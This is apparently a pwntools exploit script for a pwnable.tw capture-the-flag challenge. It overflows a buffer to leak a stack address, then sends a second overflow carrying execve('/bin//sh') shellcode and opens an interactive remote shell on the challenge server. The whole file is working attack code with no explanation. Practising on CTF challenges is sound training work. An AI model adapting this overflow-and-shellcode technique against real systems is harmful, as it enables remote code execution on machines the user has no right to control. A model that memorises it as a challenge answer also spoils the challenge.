from pwn import *
p = remote('chall.pwnable.tw', 10000)

offset = 20
mov_ecx_esp = p32(0x08048087)

shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

payload = 'A' * offset + mov_ecx_esp

print p.recvuntil(":")
p.send(payload)

leak = p.recv(4)
stack = u32(leak)

print "Stack address: ", format(hex(stack))

payload2 = 'A' * 20 + p32(stack + 20) + '\x90' * 4 + shellcode

p.sendline(payload2)

p.interactive()
